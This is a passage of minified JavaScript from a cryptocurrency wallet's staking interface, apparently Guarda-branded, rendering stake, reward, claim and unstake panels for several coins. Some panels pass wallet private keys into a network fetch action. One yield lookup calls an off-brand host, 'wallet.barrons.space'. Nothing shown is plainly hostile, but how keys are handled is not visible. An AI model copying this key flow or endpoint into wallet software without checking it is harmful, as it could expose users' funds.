            Ko.yF)((null == C || null === (w = C.net) || void 0 === w ? void 0 : w.unstaked) || "0"), " EOS"), " ", O.createElement(jA, {
                value: x((null == C || null === (b = C.net) || void 0 === b ? void 0 : b.unstaked) || "0", k)
            })))), !k.isWatchOnly && O.createElement("div", {
                className: fI
            }, O.createElement(Y.OL, {
                to: (0,
                M.RU)(`/staking-eos/staking?walletFrom=${k.uuid}`)
            }, O.createElement(Yl, {
                color: "blue"
            }, "Stake")), I && O.createElement(Y.OL, {
                to: (0,
                M.RU)(`/staking-eos/unstaking?walletFrom=${k.uuid}`)
            }, O.createElement(Yl, {
                color: "simple"
            }, "Unstake"))))
        }
          , _I = EosStakingPanel
          , wI = "cosmosvaloper1tflk30mq5vgqjdly92kkhhq3raev2hnz6eete3"
          , use_atom_validators_startFetchValidators = async e => {
            let {setLoading: t, dispatch: a} = e;
            t(!0);
            await a(fetchValidators());
            t(!1)
        }
          , useAtomValidators = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(selectedValidators)
              , a = (0,
            $.v9)(Bo)
              , [n,r] = (0,
            O.useState)(!1)
              , l = (0,
            O.useMemo)(( () => {
                const e = t.find((e => e.address === wI));
                return e || (t.length > 0 ? t[0] : void 0)
            }
            ), [t]);
            (0,
            O.useEffect)(( () => {
                !0 !== a && (t.length || use_atom_validators_startFetchValidators({
                    setLoading: r,
                    dispatch: e
                }))
            }
            ), [e, t.length, a]);
            return {
                listOfValidators: t,
                defaultValidator: l,
                isLoading: n
            }
        }
          , bI = useAtomValidators;
        function generateUndelegateLink(e) {
            let {rew: t, walletUuid: a} = e;
            const n = new URLSearchParams({
                amount: t.staked || "",
                walletFrom: a || "",
                validatorTitle: t.validatorTitle || "",
                validatorAddress: t.validatorAddress || ""
            });
            return `${(0,
            M.RU)()}/staking-atom/unstaking/confirm?${n.toString()}`
        }
        function generateWithdrawLink(e) {
            let {totalReward: t, walletUuid: a} = e;
            const n = new URLSearchParams({
                walletFrom: a || "",
                amount: t || ""
            });
            return `${(0,
            M.RU)()}/staking-atom/claim/confirm?${n.toString()}`
        }
        function AtomStaking(e) {
            let {wallet: t} = e;
            const a = (0,
            $.I0)()
              , n = (0,
            $.v9)(ax)
              , r = undefined
              , l = (0,
            $.v9)(cx)({
                uuid: t.uuid
            })
              , [s,i] = (0,
            O.useState)(null)
              , [o,c] = (0,
            O.useState)(!0)
              , {listOfValidators: u} = bI()
              , {convertToFiat: d} = useConverter()
              , {handleGo: m} = useCreateWalletAndGoTo({
                noDownloadBackup: !1
            })
              , p = t.watchOnly
              , f = (null == t ? void 0 : t.isNewWallet) || (null == t ? void 0 : t.isNewToken)
              , E = Boolean(!n && u && u.length > 0 && t)
              , h = (0,
            O.useMemo)(( () => {
                if (s && s.length)
                    return s.reduce(( (e, t) => t.isUnbonding ? e : (0,
                    Ko.PD)(e, t.reward || "0").toString()), "0")
            }
            ), [s]);
            (0,
            O.useEffect)((function fetchStakingInfo() {
                if (E && "string" == typeof t.uuid && "privateKey"in t) {
                    const e = {
                        uuid: t.uuid,
                        currency: t.currency,
                        address: t.address,
                        balance: t.balance,
                        privateKey: t.privateKey
                    };
                    a(lb.fetchActiveStakingInfoByWallet({
                        wallet: e,
                        validators: u
                    }))
                }
            }
            ), [a, t, u, E]);
            (0,
            O.useEffect)((function clearStore() {
                return () => {
                    i(null);
                    c(!0);
                    a(lb.setClearStore())
                }
            }
            ), [t.uuid]);
            (0,
            O.useEffect)((function useFetchedStakingInfo() {
                if (n && "type"in n.dto && "STAKING_INFO_SUCCESS" === n.dto.type) {
                    const e = n.dto;
                    i(e.raw);
                    c(!1)
                }
                n && "type"in n.dto && "STAKING_INFO_SUCCESS" !== n.dto.type && c(!1)
            }
            ), [n]);
            (0,
            O.useEffect)((function useStakeInfoFromStorage() {
                if (l && "type"in l.dto && "STAKING_INFO_SUCCESS" === l.dto.type) {
                    const e = l.dto;
                    i(e.raw)
                }
            }
            ), [l]);
            return !s && o ? O.createElement(loader, {
                visible: !0,
                width: 30,
                className: kx.loader
            }) : s && !s.length ? O.createElement(O.Fragment, null, O.createElement(loader, {
                visible: o,
                width: 30,
                className: kx.loader
            }), "Staked: ", O.createElement("b", null, "0 ATOM"), O.createElement("br", null), O.createElement("br", null), !p && O.createElement(O.Fragment, null, O.createElement(Yl, {
                color: "blue",
                onClick: m({
                    path: (0,
                    M.RU)("/staking-atom/staking"),
                    wallet: t,
                    isNewToken: !1,
                    isNewWallet: f,
                    parentWallet: null,
                    fromWallet: !0
                })
            }, "Stake"), O.createElement("br", null), O.createElement("br", null)), O.createElement("a", {
                href: "https://support.guarda.com/earn-rewards/get-a-reward-for-staking-atom",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "Get a reward for staking ATOM", O.createElement("img", {
                src: Bp,
                className: kx.external,
                alt: ""
            }))) : s && s.length > 0 ? O.createElement("div", {
                className: kx.wrapperClaimBlock
            }, O.createElement(loader, {
                visible: o,
                width: 30,
                className: kx.loader
            }), "Total Reward: ", O.createElement("br", null), O.createElement("b", {
                className: kx.userSelect
            }, (0,
            Ko.yF)(h, 6), " ATOM"), " ", O.createElement(jA, {
                value: d(h, t)
            }), O.createElement("br", null), !p && (0,
            Ko.gt)(h, 0) && O.createElement(O.Fragment, null, O.createElement(Y.OL, {
                to: generateWithdrawLink({
                    totalReward: h,
                    walletUuid: t.uuid
                })
            }, "Claim All"), O.createElement("br", null)), O.createElement("div", {
                className: kx.stakeLine
            }), O.createElement("div", null, s.map((e => O.createElement(O.Fragment, {
                key: `atom-stake${e.validatorAddress}${(0,
                he.Z)()}`
            }, O.createElement("div", {
                className: kx.stakeLine
            }, "Validator: ", O.createElement("b", null, e.validatorTitle), O.createElement("br", null), "Address: ", O.createElement(button_copy, {
                className: kx.address,
                text: e.validatorAddress
            }, (t => t ? O.createElement("b", null, "Copied") : O.createElement("b", null, formatAddress(e.validatorAddress, 8)))), O.createElement("br", null), e.staked && O.createElement(O.Fragment, null, "Staked: ", O.createElement("b", {
                className: kx.userSelect
            }, (0,
            Ko.yF)(e.staked, 6), " ATOM"), " ", O.createElement(jA, {
                value: d(e.staked, t)
            }), O.createElement("br", null)), e.isUnbonding ? "Unbonding" : "Reward", ": ", O.createElement("b", {
                className: kx.userSelect
            }, (0,
            Ko.yF)(e.reward || "0", 6), " ATOM"), " ", O.createElement(jA, {
                value: d(e.reward || "0", t)
            }), O.createElement("br", null), e.isUnbonding && (null == e ? void 0 : e.time) && O.createElement(O.Fragment, null, "Unbonding date: ", O.createElement("b", null, date_format(e.time)), O.createElement("br", null)), !p && !e.isUnbonding && O.createElement(Y.OL, {
                to: generateUndelegateLink({
                    rew: e,
                    walletUuid: t.uuid
                })
            }, "Undelegate")))))), !p && O.createElement(O.Fragment, null, O.createElement(Y.OL, {
                to: `${(0,
                M.RU)()}/staking-atom/staking?walletFrom=${t.uuid}`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Stake")), O.createElement("br", null), O.createElement("br", null)), O.createElement("a", {
                href: "https://support.guarda.com/earn-rewards/get-a-reward-for-staking-atom",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "Get a reward for staking ATOM", O.createElement("img", {
                src: Bp,
                className: kx.external,
                alt: ""
            }))) : null
        }
        const kI = withSettingsDisablement(AtomStaking)
          , loadInfo = async e => {
            let {setDefaultValidator: t} = e;
            const {data: {eth2: {eth_interest: a}}} = await Jf()("https://wallet.barrons.space/stake-api/eth2");
            t({
                title: "",
                apy: a
            })
        }
          , SI = undefined
          , use_eth_validators = () => {
            const [e,t] = (0,
            O.useState)({
                title: "",
                apy: ""
            });
            (0,
            O.useEffect)(( () => {
                loadInfo({
                    setDefaultValidator: t
                })
            }
            ), []);
            return {
                defaultValidator: e
            }
        }
        ;
        async function loadInformation(e, t, a) {
            if (null == e || !e.subWallets || !Array.isArray(e.subWallets))
                return;
            const n = "ropsten" === e.currency ? "0x52bCB06E1700497C44E08F168A1ED8625E97A05d" : "0x3802c218221390025bceabbad5d8c59f40eb74b8";
            let r;
            e.subWallets.length && (r = e.subWallets.find((e => {
                var t, a;
                return (null == e || null === (t = e.data) || void 0 === t || null === (a = t.smartContract) || void 0 === a ? void 0 : a.toLowerCase()) === n.toLowerCase()
            }
            )));
            r && (0,
            Ko.eg)(r.balance, "0.1") ? t({
                staked: r.balance,
                yield: a,
                nextRewardAt: !0
            }) : t({
                found: !1,
                yield: a
            })
        }
        function EthStakingPanel(e) {
            let {wallet: t} = e;
            const [a,n] = (0,
            O.useState)(null)
              , {convertToFiat: r} = useConverter()
              , {handleGo: l} = useCreateWalletAndGoTo({
                noDownloadBackup: !1
            })
              , {defaultValidator: s} = use_eth_validators();
            (0,
            O.useEffect)(( () => {
                loadInformation(t, n, s.apy)
            }
            ), [s.apy, t]);
            const i = t.watchOnly;
            return t.isNewWallet ? O.createElement(O.Fragment, null, "Staked: ", O.createElement("b", {
                className: DA.userSelect
            }, "0 ETH"), " ", O.createElement(jA, {
                value: r(0, t)
            }), O.createElement("br", null), O.createElement("br", null), O.createElement(Yl, {
                color: "blue",
                onClick: l({
                    path: (0,
                    M.RU)("/staking-eth"),
                    wallet: t,
                    isNewToken: !1,
                    isNewWallet: !0,
                    parentWallet: null,
                    fromWallet: !0
                })
            }, "Stake")) : a ? a && !1 === a.found ? O.createElement(O.Fragment, null, "Staked: ", O.createElement("b", {
                className: DA.userSelect
            }, "0 ETH"), " ", O.createElement(jA, {
                value: r(0, t)
            }), O.createElement("br", null), O.createElement("br", null), "Annual yield: ", a.yield ? `~ ${a.yield}` : "up to 2.5%", O.createElement("br", null), O.createElement("br", null), !i && O.createElement(O.Fragment, null, O.createElement(Y.OL, {
                to: `${(0,
                M.RU)()}/staking-eth?walletFrom=${t.uuid}`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Stake")), O.createElement("br", null), O.createElement("br", null)), O.createElement("a", {
                href: "https://support.guarda.com/earn-rewards/faq-ethereum-staking-pool",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "Get a reward for staking ETH ", O.createElement("img", {
                src: Bp,
                className: DA.external,
                alt: ""
            }))) : a && a.staked ? O.createElement(O.Fragment, null, "Staked: ", O.createElement("b", {
                className: DA.userSelect
            }, (0,
            Ko.yF)(a.staked, 12), " ETH"), " ", O.createElement(jA, {
                value: r(a.staked, t)
            }), O.createElement("br", null), O.createElement("br", null), "Annual yield: ", a.yield ? `~ ${a.yield}` : "up to 2.5%", O.createElement("br", null), O.createElement("br", null), a && O.createElement(O.Fragment, null, "Rewards are distributed in GETH tokens automatically every 3 month, from 25th to 5th.", O.createElement("br", null), O.createElement("br", null)), !i && O.createElement(O.Fragment, null, O.createElement(Y.OL, {
                to: `${(0,
                M.RU)()}/staking-eth?walletFrom=${t.uuid}`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Stake")), O.createElement("br", null), O.createElement("br", null)), O.createElement("a", {
                href: "https://support.guarda.com/earn-rewards/faq-ethereum-staking-pool/",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "Get a reward for staking ETH", O.createElement("img", {
                src: Bp,
                className: DA.external,
                alt: ""
            }))) : null : O.createElement(LoaderDots, {
                visible: !0
            })
        }
        const CI = withSettingsDisablement(EthStakingPanel)
          , NI = (0,
        te.createAction)("@ada-validators/SET_VALIDATORS")()
          , TI = "ada-validators"
          , AI = {
            validators: []
        }
          , xI = (0,
        te.createReducer)(AI).handleAction(NI, ( (e, t) => {
            let {payload: {validators: a}} = t;
            return {
                ...e,
                validators: a
            }
        }
        )).handleAction(ne, (e => ({
            ...e,
            validators: []
        })))
          , validators_ada_selectedValidators = e => e["ada-validators"].validators || []
          , validators_ada_fetchValidators = () => async (e, t) => {
            const a = undefined;
            if (!0 === Bo(t()))
                return;
            const n = t();
            if (validators_ada_selectedValidators(n).length)
                return;
            const r = await Se.Z.loadLightAdapterByWallet({
                currency: "ada"
            });
            if (!r)
                return;
            const l = await r.fetchValidators();
            await e(NI({
                validators: l
            }))
        }
          , II = "48c4f6c2b3ba2ab7e62f975b8a59c68d2c2929890973db1737babcaf"
          , use_ada_validators_startFetchValidators = async e => {
            let {setLoading: t, dispatch: a} = e;
            t(!0);
            await a(validators_ada_fetchValidators());
            t(!1)
        }
          , useAdaValidators = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(validators_ada_selectedValidators)
              , a = (0,
            $.v9)(Bo)
              , [n,r] = (0,
            O.useState)(!1)
              , l = (0,
            O.useMemo)(( () => {
                const e = t.find((e => e.hash === II));
                return e || (t.length > 0 ? t[0] : void 0)
            }
            ), [t]);
            (0,
            O.useEffect)(( () => {
                !0 !== a && (t.length || use_ada_validators_startFetchValidators({
                    setLoading: r,
                    dispatch: e
                }))
            }
            ), [e, t.length, a]);
            return {
                listOfValidators: t,
                defaultValidator: l,
                isLoading: n
            }
        }
          , PI = useAdaValidators;
        function isRewardAvailable(e) {
            return !(!e || !e.rewardsAmount || "0" === e.rewardsAmount)
        }
        function getClaimUrl(e) {
            let {stakeInfo: t, walletUuid: a} = e;
            if (!t)
                return "";
            const n = new URLSearchParams({
                validatorTitle: t.rawInfo.name || "",
                validatorAddress: t.rawInfo.hash || "",
                validatorRate: t.rawInfo.marginFee || "",
                walletFrom: a || "",
                amount: t.rawInfo.rewardsAmount || ""
            });
            return `${(0,
            M.RU)()}/staking-ada/claim/confirm?${n.toString()}`
        }
        const getDateString = e => {
            let {nextEpoch: t} = e;
            const {days: a, hours: n} = t
              , r = undefined
              , l = undefined
              , s = `${a} ${1 == +a ? "day" : "days"}, ${n} ${1 == +n ? "hour" : "hours"}`;
            return O.createElement(O.Fragment, null, "End of current round:", " ", O.createElement("b", null, s))
        }
          , AdaStaking = e => {
            let {wallet: t} = e;
            const a = (0,
            $.I0)()
              , n = (0,
            $.v9)(ax)
              , [r,l] = (0,
            O.useState)(null)
              , [s,i] = (0,
            O.useState)(!0)
              , o = undefined
              , c = (0,
            $.v9)(cx)({
                uuid: t.uuid
            })
              , {defaultValidator: u, listOfValidators: d} = PI()
              , {convertToFiat: m} = useConverter()
              , {handleGo: p} = useCreateWalletAndGoTo({
                noDownloadBackup: !1
            })
              , f = usePopup()
              , E = Boolean(!n && d && d.length > 0 && t)
              , h = t.watchOnly
              , g = (0,
            O.useMemo)(( () => r && "ERROR" === r.status || r && "type"in r && "STAKING_ADAPTERS_ERROR" === r.type || r && "type"in r && "STAKING_APP_ERROR" === r.type), [r])
              , createWallet = e => async () => {
                const t = await a(manageCreateWallet({
                    currency: e,
                    downloadType: Sm.AFTER_CREATE_WALLET
                }));
                window.scrollTo(0, 0);
                f.onAfterCreateWallet(t)
            }
            ;
            (0,
            O.useEffect)((function fetchStakingInfo() {
                if (E && "string" == typeof t.uuid && "privateKey"in t) {
                    const e = {
                        uuid: t.uuid,
                        currency: t.currency,
                        address: t.address,
                        balance: t.balance,
                        privateKey: t.privateKey,
                        rewardAddress: t.rewardAddress
                    };
                    a(lb.fetchActiveStakingInfoByWallet({
                        wallet: e,
                        validators: d
                    }))
                }
            }
            ), [a, t, E, d]);
            (0,
            O.useEffect)((function clearStore() {
                return () => {
                    i(!0);
                    l(null);
                    a(lb.setClearStore())
                }
            }
            ), [t.uuid]);
            (0,
            O.useEffect)((function useFetchedStakingInfo() {
                if (n && "type"in n.dto && "STAKING_INFO_SUCCESS" === n.dto.type) {
                    const e = n.dto;
                    l(e);
                    i(!1)
                }
                if (n && "type"in n.dto && "STAKING_INFO_SUCCESS" !== n.dto.type) {
                    const e = n.dto;
                    l(e);
                    i(!1)
                }
            }
            ), [n]);
            (0,
            O.useEffect)((function useStakeInfoFromStorage() {
                if (c && "type"in c.dto && "STAKING_INFO_SUCCESS" === c.dto.type) {
                    const e = c.dto;
                    l(e)
                }
            }
            ), [c]);
            if ("isNewWallet"in t && t.isNewWallet)
                return O.createElement(O.Fragment, null, "Staked: ", O.createElement("b", {
                    className: HA.userSelect
                }, "0 ADA"), " ", O.createElement(jA, {
                    value: m(0, t)
                }), O.createElement("br", null), O.createElement("br", null), O.createElement(Yl, {
                    color: "blue",
                    onClick: p({
                        path: (0,
                        M.RU)("/staking-ada/staking"),
                        wallet: t,
                        isNewToken: !1,
                        isNewWallet: !0,
                        parentWallet: null,
                        fromWallet: !0
                    })
                }, "Stake"));
            if ("ada" === t.currency)
                return O.createElement(O.Fragment, null, O.createElement("div", null, "Staking is available for ADA Shelley wallet. Add a wallet if you don", "'", "t have one yet."), O.createElement("br", null), O.createElement(Yl, {
                    color: "blue",
                    onClick: createWallet("ada-shelley")
                }, "Add ADA Shelley"), O.createElement("br", null), O.createElement("br", null), O.createElement("a", {
                    href: "https://support.guarda.com/earn-rewards/cardano-ada-staking",
                    target: "_blank",
                    rel: "noopener noreferrer"
                }, "Get a reward for staking ADA ", O.createElement("img", {
                    src: Bp,
                    className: HA.external,
                    alt: ""
                })));
            if (!r && s)
                return O.createElement(loader, {
                    visible: !0,
                    width: 30,
                    className: HA.loader
                });
            if (g)
                return O.createElement(O.Fragment, null, O.createElement(loader, {
                    visible: s,
                    width: 30,
                    className: HA.loader
                }), "Staked: ", O.createElement("b", null, "0 ADA"), O.createElement("br", null), O.createElement("br", null), !h && O.createElement(O.Fragment, null, O.createElement(Yl, {
                    color: "blue",
                    onClick: p({
                        path: (0,
                        M.RU)("/staking-ada/staking"),
                        wallet: t,
                        isNewToken: !1,
                        isNewWallet: !1,
                        parentWallet: null,
                        fromWallet: !0
                    })
                }, "Stake"), O.createElement("br", null), O.createElement("br", null)), O.createElement("a", {
                    href: "https://support.guarda.com/earn-rewards/cardano-ada-staking",
                    target: "_blank",
                    rel: "noopener noreferrer"
                }, "Get a reward for staking ADA ", O.createElement("img", {
                    src: Bp,
                    className: HA.external,
                    alt: ""
                })));
            if (r && r.status && "rawInfo"in r) {
                const e = r.rawInfo
                  , a = e.name ? O.createElement("div", null, "Validator: ", O.createElement("b", null, e.name)) : O.createElement("div", null, "Validator: ", O.createElement("b", null, formatAddress(e.hash, 6)))
                  , n = O.createElement("div", {
                    className: HA.wrapperLine,
                    key: `stake-ada-info${e.hash}`
                }, "Staked: ", O.createElement("b", {
                    className: HA.userSelect
                }, t.balance, " ADA"), " ", O.createElement(jA, {
                    value: m(t.balance, t)
                }), O.createElement("br", null), a, "Pool ID:", " ", O.createElement(button_copy, {
                    text: e.hash,
                    className: HA.buttonCopy
                }, (t => O.createElement("b", null, t ? "Copied" : formatAddress(e.hash, 6)))), O.createElement("br", null), "Fee: ", O.createElement("b", null, e.marginFee, "%"), O.createElement("br", null), e.nextEpoch && O.createElement(O.Fragment, null, getDateString({
                    nextEpoch: e.nextEpoch
                })), O.createElement("br", null), "Reward: ", O.createElement("b", {
                    className: HA.userSelect
                }, e.rewardsAmount || "0", " ADA "), " ", O.createElement(jA, {
                    value: m(e.rewardsAmount || "0", t)
                }), !h && isRewardAvailable(e) && O.createElement(Y.OL, {
                    to: getClaimUrl({
                        stakeInfo: r,
                        walletUuid: t.uuid
                    })
                }, "Claim"), O.createElement("br", null), O.createElement("br", null));
                return O.createElement("div", {
                    className: HA.wrapperPanel
                }, O.createElement(loader, {
                    visible: s,
                    width: 30,
                    className: HA.loader
                }), n, (0,
                Ko.gt)(parseFloat(null == e ? void 0 : e.marginFee), parseFloat(null != u && u.marginFee ? null == u ? void 0 : u.marginFee : "")) && O.createElement(ui_message, {
                    type: "error"
                }, "Change your validator to Guarda and pay ", (0,
                Ko.h9)(e.marginFee, null == u ? void 0 : u.marginFee).toString(), "% less in fees"), !h && O.createElement(O.Fragment, null, O.createElement(Y.OL, {
                    to: `${(0,
                    M.RU)()}/staking-ada/staking?walletFrom=${t.uuid}`
                }, O.createElement(Yl, {
                    color: "blue"
                }, "Change Validator")), O.createElement("br", null), O.createElement("br", null)), O.createElement("a", {
                    href: "https://support.guarda.com/earn-rewards/cardano-ada-staking",
                    target: "_blank",
                    rel: "noopener noreferrer"
                }, "Get a reward for staking ADA ", O.createElement("img", {
                    src: Bp,
                    className: HA.external,
                    alt: ""
                })))
            }
            return null
        }
          , LI = withSettingsDisablement(AdaStaking)
          , FI = "zil_wrapper_2IdgZ main_block_15zml"
          , WI = "zil_label_1FewS"
          , RI = "zil_stakeLine_3EG79"
          , BI = "zil_value_197Au"
          , OI = "zil_row_1z146"
          , DI = "zil_desc_2kMD8"
          , MI = "zil_buttonLink_3_1j9"
          , UI = "zil_external_B-fqn"
          , GI = "zil_error_3vqxM"
          , VI = "zil_inlineButtons_2_q-G"
          , KI = "zil_validatorAddress_1f7E2"
          , HI = "zil_link_2YGEL"
          , zI = "zil_tooltip_2q9ML"
          , jI = "zil_userSelect_27p9x"
          , $I = "zil_loader_2HA-5"
          , ZI = (0,
        te.createAction)("@zil-validators/SET_VALIDATORS")()
          , YI = "zil-validators"
          , qI = {
            validators: []
        }
          , XI = (0,
        te.createReducer)(qI).handleAction(ZI, ( (e, t) => {
            let {payload: {validators: a}} = t;
            return {
                ...e,
                validators: a
            }
        }
        )).handleAction(ne, (e => ({
            ...e,
            validators: []
        })))
          , validators_zil_selectedValidators = e => e["zil-validators"].validators || []
          , validators_zil_fetchValidators = () => async (e, t) => {
            const a = t();
            if (validators_zil_selectedValidators(a).length)
                return;
            const n = await Se.Z.getApiByCurrency("zil")
              , r = await n.fetchValidators();
            let l;
            l = "error"in r ? [] : r;
            l.sort(( (e, t) => Number(t.annualYield) - Number(e.annualYield)));
            e(ZI({
                validators: l
            }))
        }
          , QI = "0x82b82c65213e0b2b206492d3d8a2a679e7fe52e0"
          , use_zil_validators_startFetchValidators = async e => {
            let {setLoading: t, dispatch: a} = e;
            t(!0);
            await a(validators_zil_fetchValidators());
            t(!1)
        }
          , useZilValidators = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(validators_zil_selectedValidators)
              , a = (0,
            $.v9)(Bo)
              , [n,r] = (0,
            O.useState)(!1)
              , l = (0,
            O.useMemo)(( () => {
                const e = t.find((e => e.address === QI));
                return e || (t.length > 0 ? t[0] : void 0)
            }
            ), [t]);
            (0,
            O.useEffect)(( () => {
                !0 !== a && (t.length || use_zil_validators_startFetchValidators({
                    setLoading: r,
                    dispatch: e
                }))
            }
            ), [e, t.length, a]);
            return {
                listOfValidators: t,
                defaultValidator: l,
                isLoading: n
            }
        }
          , JI = useZilValidators
          , handleOnUnstake = e => {
            let {rew: t, uuid: a, history: n, amount: r} = e;
            return function onUnstake() {
                const e = new URLSearchParams({
                    validatorTitle: null == t ? void 0 : t.title,
                    validatorAddress: null == t ? void 0 : t.address,
                    walletFrom: a || "",
                    amount: r
                });
                n.push({
                    pathname: (0,
                    M.RU)("/staking-zil/unstaking"),
                    search: e.toString()
                })
            }
        }
          , handleOnClaim = e => {
            let {rew: t, uuid: a, history: n, reward: r} = e;
            return function onClaim() {
                const e = new URLSearchParams({
                    validatorTitle: t.title,
                    validatorAddress: t.address,
                    walletFrom: a || "",
                    reward: String(r) || ""
                });
                n.push({
                    pathname: (0,
                    M.RU)("/staking-zil/claim/confirm"),
                    search: e.toString()
                })
            }
        }
          , handleOnWithdraw = e => {
            let {amount: t, uuid: a, history: n} = e;
            return function onWithdraw() {
                const e = new URLSearchParams({
                    walletFrom: a || "",
                    amount: t
                });
                n.push({
                    pathname: (0,
                    M.RU)("/staking-zil/withdraw/confirm"),
                    search: e.toString()
                })
            }
        }
          , ZilStakingPanel = e => {
            let {wallet: t} = e;
            const a = (0,
            j.k6)()
              , {listOfValidators: n, defaultValidator: r} = JI()
              , {convertToFiat: l} = useConverter()
              , [s,i] = (0,
            O.useState)(null)
              , [o,c] = (0,
            O.useState)(!0)
              , u = Boolean(t.watchOnly)
              , d = (0,
            $.I0)()
              , m = (0,
            $.v9)(ax)
              , p = undefined
              , f = (0,
            $.v9)(cx)({
                uuid: t.uuid
            })
              , E = Boolean(!m && t)
              , h = Boolean(f && "type"in f.dto && "STAKING_INFO_SUCCESS" === f.dto.type)
              , g = (0,
            O.useMemo)(( () => {
                if (s && s.totalRewards)
                    return !0;
                if (s && s.withdrawalAmount)
                    return !0;
                if (s && s.unlockingAmount)
                    return !0;
                if (s && s.stakedValidators && "manyValidators"in s.stakedValidators) {
                    const e = undefined;
                    if (s.stakedValidators.manyValidators.reduce(( (e, t) => Number((0,
                    Ko.PD)(t.stakedAmount, e))), 0))
                        return !0
                }
                return !1
            }
            ), [s]);
            (0,
            O.useEffect)((function fetchStakingInfo() {
                if (E && "string" == typeof t.uuid && "privateKey"in t) {
                    const e = {
                        uuid: t.uuid,
                        currency: t.currency,
                        address: t.address,
                        balance: t.balance,
                        privateKey: t.privateKey
                    };
                    d(lb.fetchActiveStakingInfoByWallet({
                        wallet: e,
                        validators: []
                    }))
                }
            }
            ), [E, d, t]);
            (0,
            O.useEffect)((function clearStore() {
                return () => {
                    i(null);
                    c(!0);
                    d(lb.setClearStore())
                }
            }
            ), [t.uuid]);
            (0,
            O.useEffect)((function useFetchedStakingInfo() {
                if (m) {
                    if (m && "type"in m.dto && "STAKING_INFO_SUCCESS" === m.dto.type) {
                        const e = m.dto;
                        i(e)
                    }
                    c(!1)
                }
            }
            ), [m]);
            (0,
            O.useEffect)((function useStakingInfoFromStorage() {
                if (f && h) {
                    const e = f.dto;
                    i(e)
                }
            }
            ), [f, h]);
            return m || h ? !g && n.length ? O.createElement(O.Fragment, null, O.createElement(loader, {
                visible: o,
                width: 30,
                className: $I
            }), "Staked: ", O.createElement("b", {
                className: jI
            }, "0 ZIL"), " ", O.createElement(jA, {
                value: l(0, t)
            }), O.createElement("br", null), O.createElement("br", null), r && O.createElement("span", null, "Annual Yield: ", O.createElement("b", null, "~", r.annualYield, "%"), O.createElement("br", null)), O.createElement("br", null), !u && O.createElement(O.Fragment, null, O.createElement(Y.OL, {
                to: `${(0,
                M.RU)()}/staking-zil?walletFrom=${t.uuid}`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Stake")), O.createElement("br", null), O.createElement("br", null)), O.createElement("a", {
                href: "https://support.guarda.com/earn-rewards/zilliqa-zil-staking",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "How to stake Zilliqa", O.createElement("img", {
                src: Bp,
                className: UI,
                alt: ""
            }))) : g && s ? O.createElement("div", null, O.createElement(loader, {
                visible: o,
                width: 30,
                className: $I
            }), s.stakedValidators && "manyValidators"in s.stakedValidators && O.createElement("span", null, O.createElement("div", null, "Total Reward:", O.createElement("br", null), O.createElement("b", {
                className: jI
            }, (0,
            Ko.yF)(s.totalRewards, 6), " ZIL"), O.createElement(jA, {
                value: l(s.totalRewards, t)
            }), O.createElement("div", {
                className: RI
            }), s.stakedValidators.manyValidators.map(( (e, n, r) => {
                var i, o, c, d, m;
                const p = n + 1 !== r.length || !(0,
                Ko.eq)(s.unlockingAmount || "0", "0") || !(0,
                Ko.eq)(s.withdrawalAmount || "0", "0");
                return O.createElement("div", {
                    key: null === (i = e.validator) || void 0 === i ? void 0 : i.title
                }, "Staked: ", O.createElement("b", {
                    className: jI
                }, (0,
                Ko.yF)(e.stakedAmount, 5), " ZIL"), " ", O.createElement(jA, {
                    value: l(e.stakedAmount, t)
                }), " ", !u && (0,
                Ko.eq)((null === (o = e.validator) || void 0 === o || null === (c = o.bufferedStake) || void 0 === c ? void 0 : c.amount) || "0", "0") && e.validator && (0,
                Ko.eq)(e.rewardAmount || "0", "0") ? O.createElement("span", {
                    className: HI,
                    onClick: handleOnUnstake({
                        rew: e.validator,
                        uuid: t.uuid,
                        history: a,
                        amount: e.stakedAmount || ""
                    })
                }, "Unstake") : O.createElement("span", {
                    className: zI
                }, O.createElement(tooltip, {
                    text: "Claim your rewards first.",
                    width: "150px",
                    positionVertical: "top"
                }, "Unstake")), O.createElement("br", null), "Annual Yield: ", O.createElement("b", null, null == e || null === (d = e.validator) || void 0 === d ? void 0 : d.annualYield, "%"), O.createElement("br", null), "Staked: ", O.createElement("b", null, null == e ? void 0 : e.stakedAmount, " ZIL"), O.createElement("br", null), "Validator: ", O.createElement("b", null, null === (m = e.validator) || void 0 === m ? void 0 : m.title), O.createElement("br", null), "Reward: ", (0,
                Ko.eq)(e.rewardAmount || "0", "0") ? O.createElement("span", {
                    className: "dashedDisabled"
                }, "It will be accrued in 1 cycle (~1 day)") : O.createElement("span", null, O.createElement("b", {
                    className: jI
                }, (0,
                Ko.yF)(e.rewardAmount, 5), " ZIL"), " ", !u && s.totalRewards && e.validator && O.createElement("span", {
                    className: HI,
                    onClick: handleOnClaim({
                        rew: e.validator,
                        uuid: t.uuid,
                        history: a,
                        reward: e.rewardAmount
                    })
                }, "Claim")), p && O.createElement("div", {
                    className: RI
                }))
            }
            )))), !s.stakedValidators && O.createElement(O.Fragment, null, "Staked: ", O.createElement("b", null, "0 ZIL"), " ", O.createElement(jA, {
                value: l(0, t)
            }), O.createElement("br", null), r && O.createElement("span", null, "Annual Yield: ", O.createElement("b", null, "~", r.annualYield, "%"), O.createElement("br", null)), O.createElement("div", {
                className: RI
            })), (0,
            Ko.gt)(s.unlockingAmount || "0", "0") && O.createElement(O.Fragment, null, O.createElement("div", null, "Unlocking amount: ", O.createElement("b", {
                className: jI
            }, (0,
            Ko.yF)(s.unlockingAmount, 5), " ZIL"), " ", O.createElement(jA, {
                value: l(s.unlockingAmount, t)
            })), s.unlockingDate && O.createElement("div", null, "Unlocking date: ", O.createElement("b", null, "~", s.unlockingDate))), (0,
            Ko.gt)(s.withdrawalAmount || "0", "0") && O.createElement(O.Fragment, null, O.createElement("div", null, "Available to withdraw: ", O.createElement("b", {
                className: jI
            }, (0,
            Ko.yF)(s.withdrawalAmount, 5), " ZIL"), " ", !u && O.createElement("span", {
                className: HI,
                onClick: handleOnWithdraw({
                    amount: s.withdrawalAmount || "",
